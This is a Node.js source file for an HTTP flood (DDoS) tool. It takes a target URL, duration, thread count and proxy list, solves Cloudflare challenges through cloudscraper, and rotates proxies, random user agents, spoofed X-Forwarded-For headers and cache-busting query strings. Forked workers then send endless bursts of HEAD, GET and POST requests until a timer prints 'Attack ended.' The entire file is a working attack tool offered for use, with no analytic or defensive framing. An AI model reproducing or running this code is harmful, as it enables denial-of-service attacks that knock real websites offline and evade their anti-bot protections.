require('events').EventEmitter.defaultMaxListeners = 0;
const cloudscraper = require('cloudscraper');
const path = require('path');
const fs = require('fs');
var random_useragent = require('random-useragent');
const cryptoRandomString = require('crypto-random-string');
const cluster = require('cluster');

function randomNumber(min, max) {  
    return Math.floor(Math.random() * (max - min) + min); 
}

if (process.argv.length !== 7) {
    console.log(`                       
Usage: node ${path.basename(__filename)} <url> <time> <ConnectPerThread> <proxies> <thread>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt> <1>
                                                   
`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    fileproxy = process.argv[5],
    threads = process.argv[6],
    perthreads = process.argv[4];

let proxies = fs.readFileSync(fileproxy, 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

async function req(){
        var Array_method = ['HEAD',  'GET',  'POST'];
        var randommethod = Array_method[Math.floor(Math.random()*Array_method.length)];
        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        var proxiedRequest = cloudscraper.defaults({ proxy: 'http://'+proxy },{ proxy: 'https://'+proxy });
        var data = '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'}) + '=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8});
        var options = {
            method: randommethod,
			cloudflareTimeout: 5000,
			cloudflareMaxTimeout: 10000,
			challengesToSolve: 10,
			resolveWithFullResponse: true,
            headers: {'User-Agent': random_useragent.getRandom(),'Referer': target,'X-Forwarded-For': randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255),},
            uri: target + data,
            data: data
        };
        await proxiedRequest(options).then(function (response) {
			//console.log('Response: ',response);
            console.log("BYPASS_PACKET_SENT");
            for(let i = 0; i < perthreads; ++i) {
                proxiedRequest(options).then(function (response) {
                    //console.log('Response: ',response);
                    console.log("REQ_PACKET_SENT: ",i);
                }).catch(function (err) {
                    //console.log(err.message);
                    return req();
                });
            };
            return req();
        }).catch(function (err) {
			return req();
        });
    return req();
}

function run(){
 setInterval(() => {
     req();
 });	
}
main();
function main(){
    if (process.argv.length !== 7) {
        console.log(`
Usage: node ${path.basename(__filename)} <url> <time> <ConnectPerThread> <proxies> <thread>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt> <1>

`);
        process.exit(0);
    }else{    
    if (cluster.isMaster) {
        for (let i = 0; i < threads; i++) {
         cluster.fork();
        }
        cluster.on('exit', (worker, code, signal) => {
          console.log(`Threads: ${worker.process.pid} ended`);
        });
      } else {
        run();
        console.log(`Threads: ${process.pid} started`);
      }
    }
}

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});